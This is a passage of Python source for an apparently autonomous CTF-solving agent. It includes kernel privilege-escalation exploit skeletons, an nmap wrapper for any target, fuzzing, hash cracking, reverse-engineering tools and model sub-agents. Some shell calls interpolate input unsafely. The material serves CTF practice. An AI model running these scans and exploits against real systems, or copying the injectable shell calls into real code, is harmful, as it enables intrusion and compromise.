    global user_cs, user_ss, user_rsp, user_rflags
    code = """
    __asm__(
        "mov %0, cs\\n"
        "mov %1, ss\\n"
        "mov %2, rsp\\n"
        "pushf; pop %3\\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
    );
    """
    # In a real exploit: implement via inline asm in C shellcode
    # user_cs = 0x33; user_ss = 0x2b; user_rflags = 0x246

# Kernel ROP chain after overflow:
# [pop_rdi; 0; prepare_kernel_cred; call_rax_or_ret2; commit_creds;
#  kpti_trampoline; 0; 0; shell_user_rip; user_cs; user_rflags; user_rsp; user_ss]

def spawn_shell():
    os.system("/bin/sh")

print("[+] Kernel ROP template generated")
print("[!] Fill in KERNEL_BASE and offsets from /proc/kallsyms")
print("[!] Implement kernel write primitive to overwrite saved RIP on kernel stack")
''',

            "pipe_buffer_uaf": '''\
#!/usr/bin/env python3
"""
pipe_buffer UAF — overwrite pipe_buf_operations to gain arbitrary kernel code exec
Relevant for: Linux kernel < 5.16 with vulnerable driver UAF
"""
import os, ctypes

# pipe_buffer structure:
# struct pipe_buffer {
#     struct page *page;           // +0x00
#     unsigned int offset;         // +0x08
#     unsigned int len;            // +0x0c
#     const struct pipe_buf_operations *ops;  // +0x10  ← target
#     unsigned int flags;          // +0x18
#     unsigned long private;       // +0x20
# };
# pipe_buf_operations.confirm called on write → control RIP

# Step 1: create pipe
r_fd, w_fd = os.pipe()

# Step 2: write to populate pipe_buffer
os.write(w_fd, b"A" * 0x10)

# Step 3: trigger UAF on pipe_buffer (challenge-specific)
# ... depends on the vulnerable driver ioctl/read/write

# Step 4: spray fake pipe_buf_operations to known heap address
fake_ops_addr = 0x0  # from heap spray
# write confirm fn ptr = system or kernel shellcode addr

# Step 5: write to pipe to trigger confirm call
os.write(w_fd, b"B")

print("[+] pipe_buffer UAF template")
print("[!] Implement UAF trigger for specific kernel module")
''',
        }

        code = templates.get(technique, "")
        if not code:
            return f"[kernel_exploit] Unknown technique '{technique}'. Available: {list(templates)}"

        out_path = f"/tmp/kernel_{technique}.py"
        _write_file(out_path, code)
        return (
            f"[kernel_exploit] Generated {technique} skeleton → {out_path}\n"
            f"```python\n{code[:2500]}\n```"
        )

    return f"[kernel_exploit] Unknown action '{action}'. Use: info, seccomp_check, find_gadgets, gen_exploit"


# ---------------------------------------------------------------------------
# Gemini helpers — schema conversion + client factory
# ---------------------------------------------------------------------------

def _gemini_client():
    """Return a configured google-genai Client, or None if key not set."""
    import os
    key = os.getenv("GOOGLE_API_KEY")
    if not key:
        return None
    try:
        from google import genai
        return genai.Client(api_key=key)
    except Exception:
        return None


def _to_gemini_tool(schemas: list[dict]):
    """Convert our JSON tool schemas to a single google-genai Tool object."""
    from google.genai import types

    TYPE_MAP = {
        "string": "STRING", "integer": "INTEGER", "number": "NUMBER",
        "boolean": "BOOLEAN", "object": "OBJECT", "array": "ARRAY",
    }

    def _schema(prop: dict) -> types.Schema:
        t = TYPE_MAP.get(prop.get("type", "string"), "STRING")
        kwargs = dict(type=t, description=prop.get("description", ""))
        if "enum" in prop:
            kwargs["enum"] = prop["enum"]
        if prop.get("type") == "object":
            sub = prop.get("properties", {})
            kwargs["properties"] = {k: _schema(v) for k, v in sub.items()}
        return types.Schema(**kwargs)

    decls = []
    for schema in schemas:
        params = schema.get("parameters", {})
        props = {k: _schema(v) for k, v in params.get("properties", {}).items()}
        decls.append(types.FunctionDeclaration(
            name=schema["name"],
            description=schema["description"],
            parameters=types.Schema(
                type="OBJECT",
                properties=props,
                required=params.get("required", []),
            ),
        ))
    return types.Tool(function_declarations=decls)


# ---------------------------------------------------------------------------
# Auto-fix helper — uses Gemini Flash to fix broken Python scripts
# ---------------------------------------------------------------------------

def _autofix_script(failed_code: str, error_output: str) -> str | None:
    """
    Call Gemini Flash to fix a broken Python script transparently.
    Returns corrected code string, or None if Gemini unavailable.
    """
    import os, re
    client = _gemini_client()
    if not client:
        return None
    try:
        from google.genai import types
        model = os.getenv("GEMINI_AUTOFIX_MODEL", "gemini-2.0-flash")
        prompt = (
            f"Fix this Python script that failed with the error below.\n"
            f"Return ONLY the corrected Python code — no markdown, no explanation.\n\n"
            f"ERROR:\n{error_output[:1500]}\n\nCODE:\n{failed_code[:3000]}"
        )
        resp = client.models.generate_content(
            model=model,
            contents=prompt,
            config=types.GenerateContentConfig(
                system_instruction="You are an expert Python debugger. Return ONLY corrected Python code.",
            ),
        )
        text = resp.text or ""
        # Strip markdown fences if present
        m = re.search(r'```python\n(.*?)```', text, re.DOTALL)
        return m.group(1).strip() if m else text.strip()
    except Exception:
        return None


# ---------------------------------------------------------------------------
# delegate_task — Gemini Flash sub-agent for parallel exploration
# ---------------------------------------------------------------------------

def _delegate_task(task: str, category: str = None, tools_hint: str = None, session=None) -> str:
    """
    Spawn a focused Gemini Flash sub-agent for a specific subtask.
    Runs up to 10 tool-call iterations and returns compact findings.
    Falls back to Azure GPT if Gemini is unavailable.
    """
    import os
    import json as _json

    ALLOWED_SUBTASK_TOOLS = {
        "shell_exec", "read_file", "write_file", "think", "finish",
        "r2_analyze", "z3_solve", "gmpy2_compute", "web_request",
        "gdb_analyze", "find_gadget", "decompile_function", "angr_solve",
        "crack_hash", "nmap_scan", "ltrace_run", "crypto_identify",
        "cyclic_offset", "one_gadget", "ghidra_analyze",
    }

    sub_schemas = [t for t in TOOL_SCHEMAS if t["name"] in ALLOWED_SUBTASK_TOOLS]

    system_prompt = (
        f"You are a focused CTF sub-agent. Complete ONE specific task in ≤10 tool calls.\n"
        f"Task: {task}\n"
        f"Category: {category or 'unknown'}\n"
        f"Preferred tools: {tools_hint or 'any'}\n\n"
        "When done, call finish(flag=<flag_or_NOT_FOUND>, report=<findings>). "
        "Be concise. ALWAYS run code — never just reason."
    )

    findings: list[str] = []
    MAX_SUB = 10

    # ── Gemini path (primary) ────────────────────────────────────────────
    gemini = _gemini_client()
    if gemini:
        try:
            from google.genai import types
            model = os.getenv("GEMINI_SUBAGENT_MODEL", "gemini-2.0-flash")
            gemini_tool = _to_gemini_tool(sub_schemas)
            cfg = types.GenerateContentConfig(
                tools=[gemini_tool],
                system_instruction=system_prompt,
                tool_config=types.ToolConfig(
                    function_calling_config=types.FunctionCallingConfig(mode="AUTO")
                ),
            )

            contents = [types.Content(role="user", parts=[types.Part(text=task)])]

            for _ in range(MAX_SUB):
                resp = gemini.models.generate_content(model=model, contents=contents, config=cfg)
                cand_content = resp.candidates[0].content
                contents.append(cand_content)

                fn_parts = [p for p in cand_content.parts if p.function_call]
                text_parts = [p.text for p in cand_content.parts if p.text and p.text.strip()]

                for txt in text_parts:
                    findings.append(f"[reasoning] {txt[:300]}")

                if not fn_parts:
                    break  # model stopped calling tools

                tool_responses = []
                done = False
                for part in fn_parts:
                    fc = part.function_call
                    tool_args = dict(fc.args) if fc.args else {}
                    result = _dispatch(fc.name, tool_args, None)

                    if fc.name == "finish":
                        findings.append(
                            f"[RESULT] flag={tool_args.get('flag','?')} | "
                            f"{tool_args.get('report','')[:400]}"
                        )
                        done = True
                    else:
                        findings.append(f"[{fc.name}] {result[:300]}")

                    tool_responses.append(types.Part(
                        function_response=types.FunctionResponse(
                            name=fc.name,
                            response={"result": result},
                        )
                    ))

                contents.append(types.Content(role="user", parts=tool_responses))
                if done:
                    break

            return "[Sub-Agent/Gemini Report]\n" + "\n".join(findings)

        except Exception as e:
            findings.append(f"[gemini error] {e} — falling back to Azure")

    # ── Azure fallback ───────────────────────────────────────────────────
    az_key = os.getenv("AZURE_OPENAI_API_KEY")
    if not az_key:
        return "[sub-agent] No Gemini or Azure credentials available."

    try:
        from openai import AzureOpenAI
        endpoint   = os.getenv("AZURE_OPENAI_ENDPOINT", "https://graphopen.openai.azure.com/")
        api_ver    = os.getenv("AZURE_OPENAI_API_VERSION", "2025-01-01-preview")
        deployment = os.getenv("AZURE_OPENAI_DEPLOYMENT", "gpt-5.1")
        az_client  = AzureOpenAI(api_key=az_key, azure_endpoint=endpoint, api_version=api_ver)
        az_tools   = [{"type": "function", "function": {
            "name": t["name"], "description": t["description"], "parameters": t["parameters"]
        }} for t in sub_schemas]

        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user",   "content": task},
        ]
        for _ in range(MAX_SUB):
            resp = az_client.chat.completions.create(
                model=deployment, messages=messages,
                tools=az_tools, tool_choice="auto", max_completion_tokens=2048,
            )
            msg = resp.choices[0].message
            msg_dict = {"role": "assistant", "content": msg.content or ""}
            if msg.tool_calls:
                msg_dict["tool_calls"] = [
                    {"id": tc.id, "type": "function",
                     "function": {"name": tc.function.name, "arguments": tc.function.arguments}}
                    for tc in msg.tool_calls
                ]
            messages.append(msg_dict)
            if msg.content:
                findings.append(f"[reasoning] {msg.content[:300]}")

            done = False
            if msg.tool_calls:
                for tc in msg.tool_calls:
                    try:
                        tool_args = _json.loads(tc.function.arguments)
                    except Exception:
                        tool_args = {}
                    result = _dispatch(tc.function.name, tool_args, None)
                    if tc.function.name == "finish":
                        findings.append(f"[RESULT] flag={tool_args.get('flag','?')} | {tool_args.get('report','')[:400]}")
                        done = True
                    else:
                        findings.append(f"[{tc.function.name}] {result[:300]}")
                    messages.append({"role": "tool", "tool_call_id": tc.id, "content": result})
            if done or (resp.choices[0].finish_reason == "stop" and not msg.tool_calls):
                break

        return "[Sub-Agent/Azure Report]\n" + "\n".join(findings)

    except Exception as e:
        return f"[sub-agent error] {e}"



# ---------------------------------------------------------------------------
# run_afl — AFL++ fuzzer with Python mutation fallback
# ---------------------------------------------------------------------------

def _run_afl(binary: str, timeout_minutes: int = 3, input_mode: str = "stdin", seed: str = "AAAAAAA") -> str:
    """Run AFL++ on a binary; Python-mutation fallback if AFL++ not available."""
    import tempfile
    import shutil
    import signal

    timeout_minutes = min(int(timeout_minutes), 10)
    binary = str(Path(binary).resolve())

    if not Path(binary).exists():
        return f"[error] Binary not found: {binary}"

    # Check AFL++
    afl_bin = _shell_exec("which afl-fuzz 2>/dev/null").strip()
    if not afl_bin or "[error]" in afl_bin or "[SCRIPT" in afl_bin:
        return _python_mutate_fuzz(binary, timeout_minutes, seed)

    in_dir = tempfile.mkdtemp(prefix="afl_in_")
    out_dir = tempfile.mkdtemp(prefix="afl_out_")
    Path(in_dir, "seed").write_text(seed)

    try:
        target_cmd = f"'{binary}'" if input_mode == "stdin" else f"'{binary}' @@"
        afl_cmd = (
            f"AFL_NO_UI=1 AFL_SKIP_CPUFREQ=1 "
            f"timeout {timeout_minutes * 60} afl-fuzz "
            f"-i '{in_dir}' -o '{out_dir}' "
            f"-- {target_cmd} 2>&1 | tail -20"
        )
        _shell_exec(afl_cmd, timeout=timeout_minutes * 60 + 15)

        # Collect crash payloads
        crash_dir = Path(out_dir) / "default" / "crashes"
        if not crash_dir.exists():
            crash_dir = next(Path(out_dir).rglob("crashes"), None)

        if crash_dir and crash_dir.exists():
            crashes = [f for f in crash_dir.iterdir() if f.name.startswith("id:")]
            if crashes:
                reports = []
                for c in crashes[:5]:
                    payload = c.read_bytes()
                    safe = payload.replace(b"\x00", b"\\x00")[:200]
                    reports.append(
                        f"  Crash #{c.name[:20]}: {len(payload)} bytes\n"
                        f"    Hex: {payload[:32].hex()}\n"
                        f"    Safe: {safe!r}"
                    )
                return (
                    f"[AFL++] Found {len(crashes)} crash(es) in {timeout_minutes}min!\n"
                    + "\n".join(reports)
                    + f"\n\nCrash files saved in: {crash_dir}\n"
                    "Use gdb_analyze or cyclic_offset to get the exact offset."
                )

        return f"[AFL++] No crashes found in {timeout_minutes}min. Try longer timeout or different seed."
    finally:
        shutil.rmtree(in_dir, ignore_errors=True)
        shutil.rmtree(out_dir, ignore_errors=True)


def _python_mutate_fuzz(binary: str, timeout_minutes: int, seed: str) -> str:
    """Simple Python mutation fuzzer when AFL++ is unavailable."""
    import random
    import signal

    script = f'''
import subprocess, random, time, os, sys

binary = "{binary}"
seed = {repr(seed.encode())}
crashes = []
start = time.time()
deadline = start + {timeout_minutes * 60}

mutations = [
    lambda d: d + b"A" * random.randint(10, 500),
    lambda d: d * random.randint(2, 20),
    lambda d: bytes(random.randint(0, 255) for _ in range(random.randint(1, 200))),
    lambda d: d[:len(d)//2] + b"\\x00" * 50 + d[len(d)//2:],
    lambda d: d.replace(b"A", b"\\xff"),
    lambda d: b"%s" * 50 + d,
    lambda d: b"\\x41" * 300,
]

iteration = 0
while time.time() < deadline:
    payload = mutations[iteration % len(mutations)](seed)
    iteration += 1
    try:
        r = subprocess.run(
            [binary], input=payload, capture_output=True,
            timeout=2, start_new_session=True
        )
        sig = -r.returncode
        if sig in (11, 6, 4):  # SIGSEGV, SIGABRT, SIGILL
            crashes.append((sig, payload[:100].hex(), len(payload)))
            if len(crashes) >= 5:
                break
    except subprocess.TimeoutExpired:
        pass
    except Exception:
        pass

if crashes:
    print(f"[+] Found {{len(crashes)}} crash(es) in {{iteration}} iterations!")
    for sig, hexdata, size in crashes:
        sname = {{11:"SIGSEGV",6:"SIGABRT",4:"SIGILL"}}.get(sig, f"SIG{{sig}}")
        print(f"  {{sname}}: {{size}} bytes — hex: {{hexdata[:64]}}")
else:
    print(f"[-] No crashes in {{iteration}} iterations. Try gdb_analyze with long inputs.")
'''
    return _sandboxed_exec(script, "py_fuzz", None)


# ---------------------------------------------------------------------------
# nmap_scan — clean nmap wrapper
# ---------------------------------------------------------------------------

def _nmap_scan(target: str, ports: str = None, flags: str = "") -> str:
    port_arg = f"-p {ports}" if ports else "--top-ports 100"
    cmd = f"nmap -sV {port_arg} {flags} --open -T4 '{target}' 2>&1"
    return _shell_exec(cmd, timeout=60)


# ---------------------------------------------------------------------------
# ghidra_analyze — Ghidra headless decompilation
# ---------------------------------------------------------------------------

def _ghidra_analyze(binary: str, function: str = "main") -> str:
    """Decompile using Ghidra headless; fall back to r2ghidra."""
    import tempfile, shutil

    binary_path = Path(binary)
    if not binary_path.exists():
        return f"[error] Binary not found: {binary}"

    # Find Ghidra headless
    ghidra_check = _shell_exec("find /opt /usr/local /home -name 'analyzeHeadless' 2>/dev/null | head -1").strip()
    if not ghidra_check or "[error]" in ghidra_check:
        import shlex as _shlex
        binary_q = _shlex.quote(binary)
        # Fall back to r2ghidra
        if function == "all":
            cmd = f'r2 -A -q -e scr.color=0 -c "aaa;afl~sym.;pdg;q" {binary_q} 2>/dev/null | head -300'
        else:
            cmd = f'r2 -A -q -e scr.color=0 -c "aaa;pdg @ {function};q" {binary_q} 2>/dev/null'
        out = _shell_exec(cmd, timeout=30)
        return f"[r2ghidra fallback — Ghidra not found]\n{out}"

    proj_dir = tempfile.mkdtemp(prefix="ghidra_proj_")
    script_path = Path(proj_dir) / "decompile.py"

    if function == "all":
        ghidra_script = '''
from ghidra.app.decompiler import DecompileOptions, DecompInterface
from ghidra.util.task import ConsoleTaskMonitor
ifc = DecompInterface()
ifc.openProgram(currentProgram)
monitor = ConsoleTaskMonitor()
funcs = list(currentProgram.getFunctionManager().getFunctions(True))[:10]
for f in funcs:
    res = ifc.decompileFunction(f, 30, monitor)
    if res.decompileCompleted():
        print(f"\\n=== {f.getName()} ===")
        print(res.getDecompiledFunction().getC())
'''
    else:
        ghidra_script = f'''
from ghidra.app.decompiler import DecompileOptions, DecompInterface
from ghidra.util.task import ConsoleTaskMonitor
ifc = DecompInterface()
ifc.openProgram(currentProgram)
monitor = ConsoleTaskMonitor()
fn = getFunction("{function}")
if fn is None:
    for f in currentProgram.getFunctionManager().getFunctions(True):
        if "{function}" in f.getName():
            fn = f
            break
if fn:
    res = ifc.decompileFunction(fn, 30, monitor)
    if res.decompileCompleted():
        print(res.getDecompiledFunction().getC())
    else:
        print("Decompilation failed:", res.getErrorMessage())
else:
    print("Function not found: {function}")
'''
    script_path.write_text(ghidra_script)

    try:
        import shlex as _shlex
        binary_q = _shlex.quote(binary)
        ghidra_q = _shlex.quote(ghidra_check)
        proj_q = _shlex.quote(proj_dir)
        script_q = _shlex.quote(str(script_path))
        log_q = _shlex.quote(f"{proj_dir}/log.txt")
        cmd = (
            f'{ghidra_q} {proj_q} ghidra_proj '
            f'-import {binary_q} -postScript {script_q} '
            f'-scriptlog {log_q} -noanalysis 2>&1 | grep -v "^INFO" | grep -v "^WARN" | head -200'
        )
        out = _shell_exec(cmd, timeout=60)
        # If Ghidra produced nothing useful, fall back to r2 disassembly automatically
        if not out.strip() or out.strip() == f"[Ghidra] {function} decompiled:":
            r2_cmd = f'r2 -A -q -e scr.color=0 -c "aaa;pdf @ {function};q" {binary_q} 2>/dev/null'
            r2_out = _shell_exec(r2_cmd, timeout=60)
            if r2_out.strip():
                return f"[Ghidra returned empty — r2 fallback]\n{r2_out}"
            return "[Ghidra returned empty and r2 fallback also failed. Try decompile_function or unicorn_emulate.]"
        return f"[Ghidra] {function} decompiled:\n{out}"
    finally:
        shutil.rmtree(proj_dir, ignore_errors=True)


# ---------------------------------------------------------------------------
# one_gadget — magic RCE gadget finder
# ---------------------------------------------------------------------------

def _one_gadget(libc_path: str) -> str:
    if libc_path == "auto":
        libc_path = _shell_exec("find /lib /usr/lib -name 'libc.so.6' 2>/dev/null | head -1").strip()
        if not libc_path:
            return "[error] Could not find libc.so.6 automatically. Provide the path explicitly."

    check = _shell_exec("which one_gadget 2>/dev/null").strip()
    if not check or "[SCRIPT" in check:
        return (
            "[one_gadget not installed] Install with: gem install one_gadget\n"
            "Fallback: Use ROPgadget or ropper to find 'execve' gadgets manually."
        )
    return _shell_exec(f"one_gadget '{libc_path}' 2>&1", timeout=20)


# ---------------------------------------------------------------------------
# cyclic_offset — precise overflow offset via pwntools
# ---------------------------------------------------------------------------

def _cyclic_offset(binary: str, max_length: int = 300, arch: str = "amd64") -> str:
    """Find exact overflow offset using pwntools cyclic pattern + gdb."""
    max_length = min(int(max_length), 1000)
    binary = str(Path(binary).resolve())

    script = f'''
from pwn import *
import subprocess, re

context.arch = "{arch}"
context.log_level = "error"

pattern = cyclic({max_length})
Path("/tmp/cyclic_in.txt").write_bytes(pattern)

# Run with GDB to catch crash
gdb_script = """
run < /tmp/cyclic_in.txt
info registers
bt
quit
"""
Path("/tmp/cyclic_gdb.txt").write_text(gdb_script)

result = subprocess.run(
    ["gdb", "-q", "-batch", "-x", "/tmp/cyclic_gdb.txt", "{binary}"],
    capture_output=True, text=True, timeout=15
)
out = result.stdout + result.stderr

# Extract crash address
rip_match = re.search(r"rip.*?0x([0-9a-f]+)", out, re.I)
eip_match = re.search(r"eip.*?0x([0-9a-f]+)", out, re.I)
sp_match  = re.search(r"rsp.*?0x([0-9a-f]+)", out, re.I)

addr = None
if rip_match:
    addr = int(rip_match.group(1), 16)
    print(f"[+] Crash RIP = {{hex(addr)}}")
elif eip_match:
    addr = int(eip_match.group(1), 16)
    print(f"[+] Crash EIP = {{hex(addr)}}")
else:
    print("[!] No crash detected with cyclic pattern")
    print("GDB output:", out[:500])

if addr:
    try:
        off = cyclic_find(addr.to_bytes(8 if "{arch}"=="amd64" else 4, "little"))
        print(f"[+] Offset to saved return = {{off}}")
        print(f"[+] Padding: b'A' * {{off}} + p64(TARGET_ADDR)")
    except Exception as e:
        print(f"[!] cyclic_find failed: {{e}} — addr may be partial. Try offset ±8")
'''
    return _sandboxed_exec(script, "cyclic_offset", None)


# ---------------------------------------------------------------------------
# ltrace_run — library call tracer for reversing
# ---------------------------------------------------------------------------

def _ltrace_run(binary: str, input: str = "AAAAAAAAAA") -> str:
    """Run binary under ltrace to expose library calls and their arguments."""
    import shlex as _shlex
    payload_path = "/tmp/ltrace_input.txt"
    Path(payload_path).write_text(input)

    binary_q = _shlex.quote(binary)
    # ltrace with string length hint to see full comparison targets
    cmd = f"echo {repr(input)} | ltrace -s 200 -C {binary_q} 2>&1 | head -60"
    out = _shell_exec(cmd, timeout=15)

    if "not found" in out.lower() or "[SCRIPT FAILED" in out:
        # strace fallback
        cmd2 = f"echo {repr(input)} | strace -e trace=read,write,open,openat {binary_q} 2>&1 | head -40"
        out = "[ltrace unavailable — strace fallback]\n" + _shell_exec(cmd2, timeout=15)

    return out


# ---------------------------------------------------------------------------
# crypto_identify — identify hash/cipher/encoding types
# ---------------------------------------------------------------------------

def _crypto_identify(data: str) -> str:
    """Identify hash type, encoding, or cipher using hashid + heuristics."""
    data = data.strip()
    results: list[str] = []

    # Length-based hash detection
    hex_chars = set("0123456789abcdefABCDEF")
    is_hex = all(c in hex_chars for c in data)
    b64_import = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    is_b64 = all(c in b64_import for c in data) and len(data) % 4 == 0

    if is_hex:
        results.append(f"Hex string ({len(data)} chars = {len(data)//2} bytes)")
        hlen = len(data)
        hash_map = {32: "MD5", 40: "SHA1", 56: "SHA224", 64: "SHA256", 96: "SHA384", 128: "SHA512"}
        if hlen in hash_map:
            results.append(f"  → Likely hash: {hash_map[hlen]}")

    if is_b64:
        try:
            import base64
            decoded = base64.b64decode(data)
            results.append(f"Base64-encoded ({len(decoded)} bytes decoded)")
            results.append(f"  Decoded hex: {decoded[:32].hex()}")
        except Exception:
            pass

    # Common patterns
    import re
    if re.match(r'^\$2[aby]\$', data):
        results.append("bcrypt hash (starts with $2a$/$2b$)")
    if re.match(r'^\$6\$', data):
        results.append("SHA-512 crypt (Linux shadow password)")
    if re.match(r'^\$1\$', data):
        results.append("MD5 crypt (Linux shadow password)")
    if re.match(r'^[A-Z2-7]+=*$', data) and len(data) % 8 == 0:
        results.append("Base32-encoded string")
    if re.match(r'^[01\s]+$', data.replace('\n', ' ')):
        results.append("Binary string (0s and 1s)")
    if re.match(r'^[\.-]+$', data):
        results.append("Possible Morse code")

    # Try hashid if available
    hashid_out = _shell_exec(f"hashid '{data[:100]}' 2>/dev/null | head -10").strip()
    if hashid_out and "[SCRIPT" not in hashid_out and "not found" not in hashid_out.lower():
        results.append(f"\nhashid output:\n{hashid_out}")

    # Length & entropy heuristics
    results.append(f"\nLength: {len(data)} chars")
    char_set = len(set(data))
    results.append(f"Unique chars: {char_set} / {len(data)} (entropy hint: {'high' if char_set > 40 else 'low'})")

    return "\n".join(results) if results else f"Unknown format: {data[:80]}"


# ---------------------------------------------------------------------------
# _web_search — domain-specific external knowledge lookups
# ---------------------------------------------------------------------------

def _web_search(query: str, intent: str = "general") -> str:
    """
    Route CTF-relevant queries to domain-specific backends for structured results.

    Backends:
      factordb    → factor an RSA modulus via factordb.com API
      libc        → look up libc offsets by last-12-bits of a leaked address (libc.blukat.me)
      crackstation → reverse a hash via crackstation.net (best-effort HTML scrape)
      cve         → summarise a CVE via cve.circl.lu JSON API
      general     → DuckDuckGo Lite HTML scrape (no API key needed)
    """
    import re
    import urllib.request
    import urllib.parse

    intent = (intent or "general").lower().strip()

    # ----------------------------------------------------------------
    # factordb — instant factorisation for small/smooth RSA moduli
    # ----------------------------------------------------------------
    if intent == "factordb":
        n = query.strip().replace(" ", "")
        url = f"https://factordb.com/api?query={n}"
        try:
            with urllib.request.urlopen(url, timeout=10) as resp:
                import json as _json
                data = _json.loads(resp.read().decode())
            status = data.get("status", "?")
            factors = data.get("factors", [])
            if status == "FF":
                factor_str = " × ".join(f"{f[0]}^{f[1]}" if f[1] > 1 else str(f[0]) for f in factors)
                return f"[factordb] FULLY FACTORED: {n} = {factor_str}"
            elif status == "P":
                return f"[factordb] PRIME: {n} is prime"
            elif status == "C":
                return f"[factordb] COMPOSITE but NOT fully factored. Known factors so far: {factors}"
            else:
                return f"[factordb] Status={status}, factors={factors}"
        except Exception as e:
            return f"[factordb] Request failed: {e}"

    # ----------------------------------------------------------------
    # libc — find libc version from last 12 bits of leaked puts/printf
    # ----------------------------------------------------------------
    elif intent == "libc":
        # query format: "puts=0xd90" or "puts=0xd90,printf=0x7f0"
        params = urllib.parse.quote(query.strip())
        url = f"https://libc.blukat.me/query?q={params}"
        try:
            with urllib.request.urlopen(url, timeout=10) as resp:
                content = resp.read().decode(errors="replace")
            # Parse JSON results
            import json as _json
            try:
                matches = _json.loads(content)
                if not matches:
                    return f"[libc] No matches found for '{query}'. Try checking the last 3 hex digits."
                lines = [f"[libc] {len(matches)} match(es) for '{query}':"]
                for m in matches[:5]:
                    symbols = m.get("symbols", {})
                    name = m.get("id", "?")
                    system_offset = symbols.get("system", "?")
                    binsh_offset = symbols.get("str_bin_sh", "?")
                    lines.append(
                        f"  {name}: system={system_offset}, /bin/sh={binsh_offset}"
                    )
                return "\n".join(lines)
            except Exception:
                # Fallback: return raw content snippet
                return f"[libc] Raw response:\n{content[:800]}"
        except Exception as e:
            return f"[libc] Request failed: {e}\nTip: query format is 'puts=0xd90' (last 12 bits = 3 hex digits)"

    # ----------------------------------------------------------------
    # crackstation — reverse MD5/SHA1/SHA256 via online rainbow table
    # ----------------------------------------------------------------
    elif intent == "crackstation":
        hash_val = query.strip()
        # Use an unofficial JSON-friendly endpoint via form POST
        url = "https://crackstation.net/"
        post_data = urllib.parse.urlencode({"hash": hash_val, "crack": "Crack Hashes"}).encode()
        req = urllib.request.Request(url, data=post_data, headers={
            "User-Agent": "Mozilla/5.0 CTF-Agent",
            "Content-Type": "application/x-www-form-urlencoded",
        })
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                html = resp.read().decode(errors="replace")
            # Quick regex parse of result table
            cracked = re.search(r'<td[^>]*>([^<]{3,})</td>\s*<td[^>]*>([^<]+)</td>\s*<td[^>]*>([^<]+)</td>', html)
            if cracked:
                return f"[crackstation] Hash: {hash_val}\nType: {cracked.group(2)}\nCracked: {cracked.group(3)}"
            if "Not found" in html or "not in database" in html.lower():
                return f"[crackstation] NOT FOUND in rainbow table: {hash_val}\nTry hashcat with rockyou.txt instead."
            return f"[crackstation] Inconclusive result for {hash_val}. Use crack_hash() for local attack."
        except Exception as e:
            return f"[crackstation] Request failed: {e}. Use crack_hash() for local hashcat attack."

    # ----------------------------------------------------------------
    # cve — look up exploit details from cve.circl.lu
    # ----------------------------------------------------------------
    elif intent == "cve":
        cve_id = query.strip().upper()
        if not cve_id.startswith("CVE-"):
            cve_id = f"CVE-{cve_id}"
        url = f"https://cve.circl.lu/api/cve/{cve_id}"
        try:
            with urllib.request.urlopen(url, timeout=10) as resp:
                import json as _json
                data = _json.loads(resp.read().decode())
            if not data:
                return f"[cve] {cve_id} not found in database."
            summary = data.get("summary", "No summary")
            cvss = data.get("cvss", "?")
            refs = data.get("references", [])[:3]
            lines = [
                f"[cve] {cve_id} (CVSS {cvss})",
                f"Summary: {summary[:400]}",
            ]
            if refs:
                lines.append("References:")
                for r in refs:
                    lines.append(f"  - {r}")
            return "\n".join(lines)
        except Exception as e:
            return f"[cve] Request failed: {e}"

    # ----------------------------------------------------------------
    # general — DuckDuckGo Lite (no JS, no API key)
    # ----------------------------------------------------------------
    else:
        q = urllib.parse.quote_plus(query.strip())
        url = f"https://lite.duckduckgo.com/lite/?q={q}&kd=-1"
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 CTF-Agent/1.0 (compatible; research bot)",
            "Accept": "text/html",
        })
        try:
            with urllib.request.urlopen(req, timeout=12) as resp:
                html = resp.read().decode(errors="replace")
            # Extract result snippets from DuckDuckGo Lite table
            results_raw = re.findall(r'class="result-snippet"[^>]*>(.*?)</(?:td|span)>', html, re.DOTALL)
            titles_raw = re.findall(r'class="result-link"[^>]*>(.*?)</a>', html, re.DOTALL)
            if not results_raw:
                # Fallback: return first 1200 chars of raw HTML stripped
                plain = re.sub(r'<[^>]+>', ' ', html)
                plain = re.sub(r'\s+', ' ', plain).strip()
                return f"[web_search] {query}\n{plain[:1200]}"
            lines = [f"[web_search] Results for: {query}"]
            for i, (title, snippet) in enumerate(zip(titles_raw, results_raw), 1):
                title_clean = re.sub(r'<[^>]+>', '', title).strip()
                snippet_clean = re.sub(r'<[^>]+>', '', snippet).strip()
                lines.append(f"\n[{i}] {title_clean}\n    {snippet_clean[:300]}")
                if i >= 5:
                    break
            return "\n".join(lines)
        except Exception as e:
            return f"[web_search] DuckDuckGo request failed: {e}\nConsider using shell_exec('curl -sL ...')"


# ---------------------------------------------------------------------------
# _validate_flag — check flag format before submitting
# ---------------------------------------------------------------------------

_FLAG_PATTERNS = [
    # Pattern name, compiled regex
    ("picoCTF",     __import__("re").compile(r"^picoCTF\{[A-Za-z0-9_\-!@#$%^&*()+=<>?.,;:\'\" ]+\}$")),
    ("HTB",         __import__("re").compile(r"^HTB\{[A-Za-z0-9_\-!@#$%^&*()+= .]+\}$")),
    ("flag",        __import__("re").compile(r"^flag\{[A-Za-z0-9_\-!@#$%^&*()+= .]+\}$", __import__("re").IGNORECASE)),
    ("CTF",         __import__("re").compile(r"^CTF\{[A-Za-z0-9_\-!@#$%^&*()+= .]+\}$", __import__("re").IGNORECASE)),
    ("enset",       __import__("re").compile(r"^ENSET[a-zA-Z0-9_]*\{[A-Za-z0-9_\-!@#$%^&*()+= .]+\}$", __import__("re").IGNORECASE)),
    ("THM",         __import__("re").compile(r"^THM\{[A-Za-z0-9_\-!@#$%^&*()+= .]+\}$")),
    ("iCTF",        __import__("re").compile(r"^ictf\{[A-Za-z0-9_\-!@#$%^&*()+= .]+\}$", __import__("re").IGNORECASE)),
    ("generic",     __import__("re").compile(r"^[A-Z]{2,10}\{[A-Za-z0-9_\-!@#$%^&*()+= .,;:]+\}$")),
]


def _validate_flag(flag: str, platform: str = "auto") -> str:
    """
    Validate a candidate flag string against known CTF platform formats.

    Returns OK if format matches, MISMATCH with details if not.
    The agent should always call this before finish() to catch hallucinated flags.
    """
    import re

    flag = flag.strip()

    if not flag:
        return "[validate_flag] EMPTY — flag is empty string. Not submitting."

    # Use greedy generic check: flag must contain {...} somewhere
    has_braces = re.search(r'\{[^}]{2,}\}', flag)
    if not has_braces:
        return (
